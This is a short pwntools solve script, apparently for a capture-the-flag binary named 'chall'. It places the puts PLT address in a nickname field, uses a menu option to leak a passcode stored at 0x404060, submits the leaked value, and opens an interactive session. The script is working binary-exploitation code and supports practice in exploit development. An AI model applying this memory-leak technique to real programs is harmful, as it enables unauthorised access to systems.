#!/usr/bin/env python3

from pwn import *

exe = ELF('./chall', checksec=False)
r = process(exe.path)

passcode = 0x404060
pause()
r.sendafter(b'NickName>', p64(exe.plt["puts"]))
r.sendafter(b'> ', b'15')
r.sendafter(b'> ', str(0x404060).encode())


leak = u64(r.recvn(8))
print('Leaked passcode: ', hex(leak))

r.sendafter(b'> ', b'2')
r.sendafter(b'> ', str(leak))

r.interactive()